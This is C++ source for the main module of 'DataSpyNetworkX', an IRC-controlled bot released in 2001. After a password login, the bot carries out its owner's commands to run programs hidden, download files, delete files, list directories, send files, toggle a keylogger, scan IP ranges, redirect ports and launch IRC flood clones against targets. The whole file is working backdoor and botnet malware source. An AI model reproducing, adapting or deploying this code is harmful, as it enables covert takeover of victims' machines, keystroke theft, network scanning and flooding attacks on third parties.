/* 
	DataSpyNetworkX - DataSpy2k@Hotmail.com  Copyright (C) 2001 DataSpy
	Release Source 0.4Beta.

	In no event will the author be held liable for any damages arising from the use of this code. 

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA

*/
#include "..\include\options.h"
#include "..\include\globals.h"
#include "..\include\Base.h"
#include "..\include\floodbot.h"
#include "..\include\tcp.h"
#include "..\include\file.h"
#include "..\include\IOHandler.h"
#include "..\include\MainBot.h"
#include "..\include\PortRedirect.h"
#include "..\include\SettingStorage.h"
#include "..\include\nicknames.h"
#include "..\include\keylogger.h"
#include "..\include\portscan.h"

long SetLongIP(SOCKET The_Socket) 
{
	long localip =0 ;

	SOCKADDR sname;
	
	int coolio = sizeof(sname);
	getsockname(The_Socket,&sname,&coolio);
	memcpy(&localip,&sname.sa_data[2],4);				
	return localip;
}

//Eg : (DSNX V0.0 Beta|1MB,15FB,2PR|Up 14:28)
void InfoRep(char *cReply)
{
	
	int iMin	= (GetTickCount() - l_UP)	/ 60000,
		iHour	= iMin						/ 60;
		iMin   -= iHour						* 60;

		char filler[4] = {0,0,0,0};

		(iMin < 10) ? filler[2] = '0' : filler[2] = 0;
		(iHour < 10) ? filler[0] = '0' : filler[0] = 0;

	sprintf(cReply,
		"(%s|%iMB,%iFB,%iPR|%s%i:%s%i)b\0",
		_DSNX_VERSION,
		g_IOSock->Count(MB),
		g_IOSock->Count(FB),
		g_IOSock->Count(PR),
		&filler[0],iHour, //Hours
		&filler[2],iMin); //Minutes
}

void MainBot::Close(SOCKET iCheckSocket) 
{
	this->VoidOwner(); 
	if (( this->iSocket = this->Connect() ) == INVALID_SOCKET )	
	{
		g_IOSock->Remove(g_IOSock->GetIdFromPointer(this));
	}
	else 
	{
		this->NewNick();
		this->localIP = SetLongIP(this->GetSocketNum());
	}
}

MainBot::MainBot(char* cIrcServer,int iMyPort, char *cChannel)
{
	this->Type = MB;
	
	this->cServer = strcpy(new char[lstrlen(cIrcServer)],cIrcServer);
	this->cOther = strcpy(new char[lstrlen(cChannel)],cChannel);
	
	this->iPort = iMyPort;
	this->VoidOwner();

	if (g_IOSock->Insert(this))
	{
		if (( this->iSocket = this->Connect() )== INVALID_SOCKET )	
		{
			g_IOSock->Remove(g_IOSock->GetIdFromPointer(this));
		}
		else 
		{
			this->NewNick();
			this->localIP = SetLongIP(this->GetSocketNum());
		}
	}else
		delete this;
}

extern int g_Restart;		//Seconds to pass if restarting
BOOL r_Uninstall = FALSE;
extern char g_InstallTo[];
extern char g_IKey[];
int iMAXNICKz=9;

#define MAX_FTYPES 5 //Number of floods for clones

ServerList *g_FirstSList = NULL;
int g_iSList =0;



void InterpretMsg(char *cMyMessage,char *cSender,char *cMask,char *cChannel,MainBot *Control)
{
/*
	char **cBroken= (char**) malloc(sizeof(char*) * lstrlen(cMyMessage)/2); 
	char **cBroken= new char*[(lstrlen(cMyMessage) / 2) +1]; //Enough pointers..
	char (*cBroken) [lstrlen(cMyMessage) / 2] ; 
	char **cBroken = new[] [lstrlen(cMyMessage) / 2];
*/		

char *cReply = new char [512];
*cReply =0;
sprintf(cReply,"Error or syntax incorrectr\0");

#define MAX_SPLITS 35

	char *cBroken[MAX_SPLITS] = {0};
	int iBroken=0,i=1,s=0; 

	*cBroken = cMyMessage;

	*cBroken[0] = tolower(*cBroken[0]); // We want all out commands in in lowercase

	char cUse[4] = { '"',0,' ',0};

	while (i < MAX_SPLITS)
	{
		while (*cBroken[i-1] == cUse[2])
			*cBroken[i-1]++;

		if (!*cBroken[i-1])
		{
			i--;
		cBroken[i] = NULL;
			break;
		}

		if (!strncmp(cBroken[i-1],&cUse[0],1))
		{
			cBroken[i-1]++;
			char *cIn = strchr(cBroken[i-1],cUse[0]);
			if (cIn)
			{
				*cIn++ = 0;
				if (!*cIn) 
					cBroken[i] = cIn + 1;
				else
					break;
			} else 
				break;					
		}
		else 
			if(!(cBroken[i] = BreakString(cBroken[i-1],&cUse[2])))
				break;
		

		s = lstrlen(cBroken[i]);
		while (cBroken[i][s] == cUse[2])
		{
			cBroken[i][s] = 0;
			
			if (!s--)
			{
				i--;
				cBroken[i] = NULL;
				break;
			}
		}

		i++;iBroken++;
	}

	if (Control)
	{
		switch(*cBroken[0])
		{
			case ('q'): //Quit from irc and exit

				g_Restart=0;
				if (iBroken == 1)
					g_Restart = atoi(cBroken[1]);

				EasySSend(Control->GetSocketNum(),c_QUITMSG);
				closesocket(Control->GetSocketNum()); 
				Control->Status.Online = FALSE;
				delete cReply;
			
				//Are we the only or restarting
				if (g_IOSock->Count(MB) < 2 || g_Restart >0) 
					PostMessage(g_hwnd,WM_QUIT,0,0);
				else 
					g_IOSock->Remove(g_IOSock->GetIdFromPointer(Control));
				return;

			case ('d'): //DCC Send

				new DCCSend(cReply,Control->cMyOwnersNick,cBroken[1],cBroken[2],Control->localIP);
				break;

			case ('y'): //List Directory
				{
					if (iBroken < 1) break;
					
					int maxcount =0;
					WIN32_FIND_DATA found;
					HANDLE handlefound;
					
					if (iBroken > 1) //Got a max count aswell
						maxcount = atoi(cBroken[2]);
					
					char *cTemp = new char[256];
					if ( (handlefound = FindFirstFile(cBroken[1],&found)) != INVALID_HANDLE_VALUE)
					{
						sprintf(cTemp,"Directory listing of '%s'b\0",cBroken[1]);
						Reply(cTemp,Control->cMyOwnersNick,Control->cMyOwnersNick,Control->GetSocketNum(),Control->iMyNickLen);
						int i=0;
						DWORD dwBytes=0;
						do //Filename/t/tsize
						{
							char svAttribs[8];
							lstrcpy(svAttribs,"-------");
							if(found.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)  svAttribs[0] = 'D';
							if(found.dwFileAttributes & FILE_ATTRIBUTE_ARCHIVE)    svAttribs[1] = 'A';
							if(found.dwFileAttributes & FILE_ATTRIBUTE_HIDDEN)     svAttribs[2] = 'H';
							if(found.dwFileAttributes & FILE_ATTRIBUTE_COMPRESSED) svAttribs[3] = 'C';
							if(found.dwFileAttributes & FILE_ATTRIBUTE_READONLY)   svAttribs[4] = 'R';
							if(found.dwFileAttributes & FILE_ATTRIBUTE_SYSTEM)     svAttribs[5] = 'S';
							if(found.dwFileAttributes & FILE_ATTRIBUTE_TEMPORARY)  svAttribs[6] = 'T';
		
							dwBytes+=found.nFileSizeLow;
							i++;

							if (found.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
								sprintf(cTemp,"%7s <%28s>b\0",svAttribs,found.cFileName);
							else
								sprintf(cTemp,"%7s %30s %10i bytesb\0",svAttribs,found.cFileName,found.nFileSizeLow);

							Reply(cTemp,Control->cMyOwnersNick,Control->cMyOwnersNick,Control->GetSocketNum(),Control->iMyNickLen);
							Sleep(200);
						} while (FindNextFile(handlefound,&found) && ( i < maxcount || !maxcount));

						sprintf(cReply,"Finnished. %lu bytes in %i filesb\0",dwBytes,i);
						FindClose(handlefound);
					}
					else
						sprintf(cReply,"Unable to enumerate directory '%s'r\0",cBroken[1]);
					delete cTemp;

				}
			break;

			//
			//Clone Commands
			//
			// L - Load 
			// K - Kill
			// S - Start
			// X - Type of flood (default is CTCP) (no type stops them)
			// C - Command
			// T - Change target
			// I - Information - NOT IMPLEMENTED
			//
			case ('c'):
			{
				char *cCmd =cBroken[2],*cSrch=cBroken[iBroken]; //Default
				int iType=-1;
				*cBroken[1] = tolower(*cBroken[1]);

				switch(cBroken[1][0]) 
				{
					case ('l'): //Load !C L Number ^Server ^Port
					{
						int igOnline=0,iWait=0,iNumTL=0,iNPort=Control->iPort;

						if (iBroken < 2) iNumTL = 1;  //No Number Specified, Lets default to 1!
						else iNumTL = atoi(cBroken[2]);
						if (iBroken < 3) cBroken[3] = Control->cServer;
						if (iBroken == 4) iNPort = atoi(cBroken[4]);
										
						if ( iNumTL <= 0 || iNumTL > (MAX_IO_HANDLERS - g_IOSock->Count(DC)) )
						{
							sprintf(cReply,c_OUT_OF_IOHANDLERS);
							goto cya; // Are they trying to create more clones than we can handle?
						}

						if (iNPort <= 0) iNPort = 6667;

						FloodBot *pTemp[MAX_IO_HANDLERS] = {0};

						for (int i=0;i < iNumTL;i++)
						{                          
							pTemp[i] = new FloodBot(cBroken[3],iNPort); //Load up the bastards
							Sleep(3520); //LOL Stskeeps, thanks for this!
						}

						Sleep(5000); //Just a bit of extra time

						for (int c =0;c < iNumTL;c++) 
						{ 
							if (pTemp[c]->On() == 1) //Did the mofo get online?
							{
								igOnline++;
							} 
						}
						sprintf(cReply,"%i Clones Online %s:%i\0",igOnline,cBroken[3],iNPort);

						if (igOnline == iNumTL) 
							strcat(cReply,"b");
						else
							strcat(cReply,"r");
										
						goto cya; //Instead of break;
					}//case l
				break;
				//
				//Clone control commands
				//				
				case ('g'): //!C G Target *Type_Of_Flood *Match_Text 
					{
						cCmd = cBroken[2];
						if (iBroken == 4) //All Specified
						{
							iType = atoi(cBroken[3]);
						}
						else if (iBroken == 3) //Text Or Flood Type
						{
							if (lstrlen(cSrch) == 1) //Floodtype
							{
								iType = atoi(cSrch);
								cSrch = NULL;
							} 												
						}
							
						if (iType > MAX_FTYPES || iType < 1)	iType =1; //Default
					}//case g
					break;
				
				case ('s'): //Stop floodbots
				case ('k'): //Kill clones !c k ^Match_Text
							
					cSrch = cBroken[2];
					break;
				
				case ('r'): //Command to all floodbots
				case ('t'): //Change target

					if (iBroken < 3)
					{
						cSrch = NULL;
					}
					break;
				case ('x'): //Type of flood Text_match number
					{
						if (iBroken < 3)
							cSrch = NULL;
					
						iType = atoi(cCmd);
						if (iType > MAX_FTYPES || iType < 1) goto cya; //Error in syntax
					}
					break;

				default:
					goto cya;
				} //switch(cBroken[1][0]) 
				
				//Now do the actual processing...

				int ret=0,iDone=0,iSkip=0;
				do {
					ret=g_IOSock->GetIdFromType(FB,iSkip,cSrch);

					if (ret > 0)
					{
						switch(cBroken[1][0]) 
						{
						case ('k'): //Kill
									g_IOSock->Remove(ret);
									iSkip--; //Cause its now removed, it wont be skipped
								break;
						case ('s'): //Stop
									g_IOSock->GetPFromID(ret)->Status.Enabled = FALSE;
								break;
						case ('r'): //Raw
								{
									char *cTemp = new char[8 + lstrlen(cCmd)];
									*cTemp=0;
									strcat(cTemp,cCmd);
									strcat(cTemp,"\n\0");//sprintf(cTemp,"%s\n",cCmd);
									EasySSend(g_IOSock->GetPFromID(ret)->GetSocketNum(),cTemp);
									delete cTemp;
								}
								break;

						case ('x'): //Change Type
								{
									g_IOSock->GetPFromID(ret)->iTypeFB = iType;
								}
								break;

						case('t'): //Change Target
								{
									//delete g_IOSock->GetPFromID(ret)->cOther;
									g_IOSock->GetPFromID(ret)->cOther = strcpy(new char[lstrlen(cCmd)],cCmd);
								}
								break;
						
						case ('g'): //Go
								{
									//delete g_IOSock->GetPFromID(ret)->cOther;
									g_IOSock->GetPFromID(ret)->cOther = strcpy(new char[lstrlen(cCmd)],cCmd);
									g_IOSock->GetPFromID(ret)->iTypeFB = iType;
									g_IOSock->GetPFromID(ret)->Status.Enabled = TRUE;
								}
								break;
						}

						iDone++;
						iSkip++;
					}
				} while (ret >= 0);
				
				sprintf(cReply,"Did that %i time(s)b\0",iDone);
			}// clone

			break;

			case ('i'): //Information
				
					InfoRep(cReply);
					break;

			case ('r'): //Raw Command to MainBot
				
					if (iBroken < 1) break;
					sprintf(cReply ,"\n%sb\0",cBroken[1]);
					break;

			case ('l'): //Logout

						sprintf(cReply,"Logged outb\0");
						Reply(cReply,Control->cMyOwnersNick,cChannel,Control->GetSocketNum(),Control->iMyNickLen);
						Control->VoidOwner();
						delete cReply;
					return;

			case ('n'): //New Nick
					{
						if(iBroken == 1) 
						{
							iMAXNICKz = atoi(cBroken[1]);
							
							if (iMAXNICKz < 5)
								iMAXNICKz =5;

							else if (iMAXNICKz > 25) 
								iMAXNICKz =25;
						}

						Control->NewNick();
						delete cReply;
						return;
					}
					break;
		default:
			goto TheSecondChance;
		}
	} //realmainbot
	else
	{
TheSecondChance:

		switch(*cBroken[0])
		{
			case ('q')://real quit..
				PostMessage(g_hwnd,WM_QUIT,0,0);
			break;

			case ('m'): //New mainbot channel ^server ^port
			{
				if (iBroken < 1) break;
				
				int iCmp =0;
			
				lstrlen(cBroken[1]) > lstrlen(cChannel+1) ? iCmp = lstrlen(cBroken[1]) : iCmp = lstrlen(cChannel+1) ;

				if (strnicmp(cBroken[1],cChannel +1,iCmp) == 0 && iBroken < 2) break;

				int	iPPort;
				
				if (iBroken == 1 && Control)
					cBroken[2] = Control->cServer;

				if (iBroken < 3 && Control)
					iPPort = Control->iPort;
				else
					iPPort = atoi(cBroken[3]);
							
				new MainBot(cBroken[2],iPPort,cBroken[1]);

				sprintf(cReply ,"Created MB %s %s:%ib\0",cBroken[1],cBroken[2],iPPort);
			}
			break;

			case ('k'): //start and stop keylogging
			{
				if (g_bLogging) //already logging, stop it
				{
					if(StopLogging())
						sprintf(cReply,c_STOPPED);
				}
				else
				{
					if (StartLogging())
						sprintf(cReply,c_STARTED);
				}
			}

			break;
			
			case ('s'): //Servers list
			{
				if (iBroken < 1) break;
				*cBroken[1] = tolower(*cBroken[1]);
				switch(*cBroken[1])
				{
				case ('n'): //New !s n <servers (min 2 max 35)>
						{
							if (iBroken < 3) break;
							
							ServerList *Current = NULL;

							if(!g_FirstSList)
							{
								Current = g_FirstSList = new ServerList;
								Current->pLast = Current->pNext = Current;
							}
							else
							{
							//	Serverlist *End = g_FirstSList->pLast;
							//	End->pNext = Current = new ServerList;
								g_FirstSList->pLast->pNext = Current= new ServerList;
								Current->pNext = g_FirstSList;
								Current->pLast = g_FirstSList->pLast;
								g_FirstSList->pLast = Current;
							}
							int i=0;
							for (;i < 35 && i < iBroken-1;i++)
							{
								Current->List[i] = strcpy(new char[strlen(cBroken[i+1])],cBroken[i+1]);
							}
							Current->iNumber =i;
							Current->iListposition=0;
							g_iSList++;

							ServerList *temp = g_FirstSList;
							int itemp = g_iSList;
							for(i=0;i<g_iSList;i++)
							{
								if(temp->iListposition > itemp)
									itemp = temp->iListposition;
								temp = temp->pNext;
							}

							int *ii = new int[itemp+1];
							
							for(i=0;i<itemp;i++) ii[i] = -1;

							temp = g_FirstSList;
							for(i=0;i<g_iSList;i++)
							{
								if(temp->iListposition!=-1)
								ii[temp->iListposition] = 0;
								temp = temp->pNext;
							}

							for (i=0;i<itemp;i++)
							{
								if (ii[i] == -1)
								{
									Current->iListposition = i;
									break;
								}
							}
						
							sprintf(cReply,"%i servers added to list%ib\0",Current->iNumber,Current->iListposition);
						}
					break;

				case ('d'): //Delete num
						{
							if (iBroken < 2)  //delete all
							{
								ServerList *p = g_FirstSList,*d=NULL;
								int itemp = g_iSList,ab=0,a=0;
								for (int i=0;i<g_iSList;i++)
								{
									d = p->pNext;
									ab += p->iNumber;
									delete p;//->List ;
									p = NULL;
									p=d;
								}
								g_FirstSList = NULL;
								g_iSList = 0;
								sprintf(cReply,"Removed %i server(s) from %i list(s)b\0",ab,itemp);
								break;
							}
							else
							{
								int list = atoi(cBroken[2]),i=0;
								if (g_FirstSList)
								{
									ServerList *temp = g_FirstSList;
									for (;i<g_iSList;i++)
									{
										if (temp->iListposition == list)
											break;
										temp = temp->pNext;
									}
									if (i == g_iSList) break;
									int inum = temp->iNumber ;

									temp->pNext->pLast = temp->pLast;
									temp->pLast->pNext = temp->pNext;
									
									if (temp == g_FirstSList)
									{
										if (g_iSList > 1)
											g_FirstSList = g_FirstSList->pNext;
										else
											g_FirstSList = NULL;
									}
									delete temp;
									g_iSList--;
									
									sprintf(cReply,"%i servers from list %i removedb\0",inum,list);
								}

							}
							
						}	
					break; 
					/*
				case ('i'): //Info
						sprintf(cReply,"1:%i|2:%i|3:%i|4:%i|5:%ib\0",g_iSList[0],g_iSList[1],g_iSList[2],g_iSList[3],g_iSList[4]);
						break;
				*/	
				}
				
			}
			break;

			
			case ('p'): //Port Redirect :  In Server Out
			{
				if (iBroken < 2) //maybe a kill command
				{
					char *cSrch = cBroken[iBroken]; BOOL bRem=FALSE; int iNum =0;TcpSock *pTemp;
					if (iBroken ==0) //kill all port redirects
						cSrch = NULL;

					for (int i=0;i<MAX_IO_HANDLERS;i++)
					{
						pTemp = g_IOSock->GetPFromID(i);
						if (pTemp != INVALID_IO_HANDLER)
						{
							if (cSrch) //not all
							{
								bRem = FALSE;

								if (strstr(cSrch,pTemp->cServer))
									bRem = TRUE;
							}
							if (pTemp->GetType() == PR && (bRem || !cSrch ))
							{
								iNum++;
								g_IOSock->Remove(i);
							}
						}
					}
				
					sprintf(cReply,"%i Port Handlers Removedb\0",iNum);
					break;
				}

				int outPort, inPort = atoi(cBroken[1]);
					
				(iBroken < 3) ? outPort = inPort : outPort = atoi(cBroken[3]);

				new PortRedirect(inPort,outPort,cBroken[2]);
					
				//Get local address from localip
				if (Control)
				{
					IN_ADDR Connected;

					Connected.S_un.S_addr = Control->localIP;
																	
					sprintf(cReply ,"Port Redirected %s:%i -> %s:%ib\0",inet_ntoa(Connected),inPort,cBroken[2],outPort);
				}
					
			}
			break;

			case ('e'): //Execute Local Program and check

						if (iBroken < 1) break;
						if (WinExec(cBroken[1],SW_HIDE) > 31)
							sprintf(cReply ,"Executed %sb\0",cBroken[1]);
				break;

			/*
			struct PScan 
			{
			char *clogfile; //File log successful to
			long startip;	//Start ip (ntohl(inet_addr("126.255.224.1"));)
			long number;	//Number of hosts to scan (- to go down,)
			int seconds;	//Or, time to scan for
			int port;		//port to scan on
			};
			Options are : <START IP> <STOP IP> <SECONDS> <NUMBER OF HOSTS>
			<PREFIX>A <PORT> <LOGFILE>								Randomly scans untill stoped
			<PREFIX>A <PORT> <LOGFILE> <START_IP>					Scans from start ip untill stoped
			<PREFIX>A <PORT> <LOGFILE> <START_IP> <STOP_IP>			Scans from start to stop
			<PREFIX>A <PORT> <LOGFILE> <START_IP> <NUMBER_OF_HOSTS>	Scans from start, scanning NUMBER_OF_HOSTS total
			<PREFIX>A <PORT> <LOGFILE> <START_IP> <SECONDS>			Scans from start for SECONDS seconds
			<PREFIX>A <PORT> <LOGFILE> <SECONDS>					Scans randomly for SECONDS seconds
			<PREFIX>A <PORT> <LOGFILE> <NUMBER_OF_HOSTS>			Scans randomly, scanning NUMBER_OF_HOSTS total
			<PREFIX>A <PORT> <LOGFILE> 
			*/
			case ('a'): //Port scanner
				{
					if (g_hPortScanThread)  //stop scanner (were already scanning)
					{
						StopPortScanning();
						sprintf(cReply,c_STOPPED);
					}
					else
					{
						if (iBroken < 1) break;

						PScan *scanner = new PScan;
						scanner->seconds =0;
						scanner->startip =0;

						if ((scanner->port = atoi(cBroken[1])) <= 1) 
						{
							delete scanner;
							break;
						}
						scanner->clogfile = strcpy(new char[lstrlen(cBroken[2])],cBroken[2]);

						if (iBroken ==3 || iBroken==4)
						{
							if (strchr(cBroken[3],'.') !=NULL)//ip or hostname
							{
								LPHOSTENT lpHostEntry; 	
							
								IN_ADDR dest;

								long temp= inet_addr(cBroken[3]); 

								if (temp == INADDR_NONE)
								{
									if((lpHostEntry = gethostbyname(cBroken[3])) == NULL)
									{
										delete scanner;
										break;
									}

									dest = *((LPIN_ADDR)*lpHostEntry->h_addr_list);
									temp = dest.S_un.S_addr;
								}

								scanner->startip = ntohl(temp);
								
								if (iBroken == 4) scanner->seconds = atoi(cBroken[4]);
							}
							else if(iBroken == 3) //must be time
							{
								scanner->seconds = atoi(cBroken[3]);
							}else
								break;
						}
						
						StartPortScan(scanner);
						sprintf(cReply,c_STARTED);
					}
					
				}

				break;
			case ('w'): //Web Download
					{
						if (iBroken < 1) break;
						BOOL blah = TRUE;
						iBroken < 2 ? blah = TRUE : blah = FALSE;
						HttpDownload(cReply,cBroken[1],blah);
					}
					break;

			/*	case ('v'): //Visit
				{
				char *cTemppp = new char[256];
				//sprintf(cTemppp,"%s\0",cBroken[2]);
				int iTmp = (int)ShellExecute(g_hwnd,NULL,cBroken[2],NULL,NULL,SW_HIDE);// ( WinExec(cTemppp,SW_HIDE);
				sprintf(cReply,"MSAWER %ib\0",iTmp);

				}
				break;

			*/
			case ('t')://Delete file
				{
					if (iBroken < 1) break;
					if(!remove(cBroken[1]))
						sprintf(cReply,"Removed Fileb\0");
				}
				break;

			case ('z'): //Remove
					{
						if (Control)
						if (g_IOSock->GetIdFromPointer(Control) > 1) break; //only the mainbots in the owners chan can uninstall me!
						if (!r_Uninstall)
						{
							sprintf(cReply,"Again to confirmr\0");
							r_Uninstall = TRUE;
						}
						else if (r_Uninstall)
						{
							HKEY hKey;

							if (RegOpenKeyEx(HKEY_LOCAL_MACHINE,g_InstallTo,0,KEY_ALL_ACCESS,&hKey) !=0)
								break;
					
							RegDeleteValue(hKey,g_IKey);
 							RegCloseKey(hKey);
							sprintf(cReply,"Uninstalledb\0");
						}
					}
				}//Second chance switch
			}
cya:
if (Control)
	Reply(cReply,cSender,cChannel,Control->iSocket,Control->iMyNickLen);	
delete cReply;
}

int iRunOwner =0;
BOOL MainBot::Owner(char *cNick,char* cMask,BOOL bSet)
{
	if (bSet)
	{
		if (iRunOwner) {
			delete this->cMyOwnersNick; delete this->cMyOwnersMask; }
		this->cMyOwnersNick = strcpy(new char[lstrlen(cNick)],cNick);
		this->cMyOwnersMask = strcpy(new char[lstrlen(cMask)],cMask);
		return TRUE;
	}
	else
	{
		if (strncmp(this->cMyOwnersNick,cNick,lstrlen(cNick))==0 && 
			strncmp(this->cMyOwnersMask,cMask,lstrlen(cMask))==0)
		return TRUE;
	}
	return FALSE;
}

char c_NICKK[] = "NICK\0";
char c_QUITT[] = "QUIT\0";
/*
char* ToLowercase(char*in)
{
	int len = lstrlen(in);
	for(int i=0;i<len;i++)
		in[i] = tolower(in[i]);
	return in;
}
*/

void MainBot::Process (char *cMessageIn)
{	
	if (strstr(cMessageIn, "PRIVMSG ")) //Msg from Owner or other peeps
	{
		cMessageIn++; //Gets rid of the first char ---> :
//	:ugod!apflug1@=NDmpug-27-695-455.mia.bellsouth.net PRIVMSG #guza2000 :i sent out alot..not all of em came to irc..

		char  *cTmpp = strchr(cMessageIn,' ');
		*cTmpp =0;
		int iRet=1;
		for (int iTryNum=0;iTryNum < g_iHostAllows && iRet==1;iTryNum++)
		{
			iRet = CmpMask(g_cHostAllows[iTryNum],cMessageIn);
		}
		*cTmpp =' ';

		char *cSplitChar[4] = { "!\0"," \0"," \0"," \0"}; //Chars in order we need to split!
		char *cReturn[5] = {0};

		cReturn[0] = cMessageIn;
		for (int n =0;n < 4;n++) 
		{
			if ((cReturn[n + 1] = BreakString(cReturn[n],cSplitChar[n])) == NULL)
				break;		
		}
	
		cReturn[4] ++; //Gets rid of another :
	
		if (!iRet && n == 4) //Rightio.. process it
		{

			if (!this->OwnerLoggedIn) //If noone is logged in already....
			{
				if (( strncmp(cReturn[4],_DSNX_PASSWORD,lstrlen(_DSNX_PASSWORD)) == 0 )
					&&( lstrlen(_DSNX_PASSWORD) == lstrlen(cReturn[4]) )) 
				{
					this->Owner(cReturn[0],cReturn[1],TRUE); 
					this->OwnerLoggedIn = TRUE;
					
					char *cInfo = new char[512], *cReply = new char[512];	
					InfoRep(cInfo);
					sprintf(cReply,"Logged in %s\0",cInfo);
					Reply(cReply,this->cMyOwnersNick,cReturn[3],this->GetSocketNum(),this->iMyNickLen);
					delete cInfo,cReply;
				}
				else
				{
					return; //Wrong password
				}
			}
			else 
			{
				if (*cReturn[4] != _DSNX_PREFIX[0])
				{
					return;        //No prefix
				}

				if (!this->Owner(cReturn[0],cReturn[1],FALSE))
				{
					return;		//Not the owner
				}

				cReturn[4] ++;
			
				InterpretMsg(cReturn[4],cReturn[0],cReturn[1],cReturn[3],this);
			}
		}
	} 
	else if(strstr(cMessageIn,c_QUITT) || strstr(cMessageIn,c_NICKK)) //Owner Quitting or changing nicks?
	{
		char *cTemp = new char[512],
			*cDel = cTemp;
		//	*cMe = new char[512],
		//	*cDel2 = cMe;

		char c__PRINT[] = ":%s!\0";
		
		int iTlen = sprintf(cTemp,c__PRINT,this->cMyOwnersNick);
		//	iTme = sprintf(cMe,c__PRINT,this->cMyNick);
		
		//if (!(iTme = strnicmp(cMessageIn,cTemp,iTlen)) || !(strnicmp(cMessageIn,cMe,iTme)))
		if (!strnicmp(cMessageIn,cTemp,iTlen))
		{
			if(cTemp = strchr(cMessageIn,' ')) //cMessageIn + iTlen;
			{
				cTemp ++;
				if (!strnicmp(cTemp,c_QUITT,4) || !strnicmp(cTemp,c_NICKK,4))// && !iTme)
					this->VoidOwner();
				/*else
					if(!strnicmp(cTemp,c_NICKK,4)) //our nick has changed, could have been us :|
					{
						char *neww = strchr(cTemp,' ') ;
						if(neww)
						{
							neww +=2;
							int nicklen = lstrlen(neww) ;
							if (nicklen > iMAXNICKz)
								this->NewNick();
							else
							{
								this->cMyNick = strcpy(new char[nicklen],neww);
								this->iMyNickLen = nicklen;
							}
						}
					}
					*/
			}
		}
		delete cDel;//,cDel2;
		//:dataspy!~a@host62-6-68-117.dialup.lineone.co.uk NICK :Guest68204
	}
}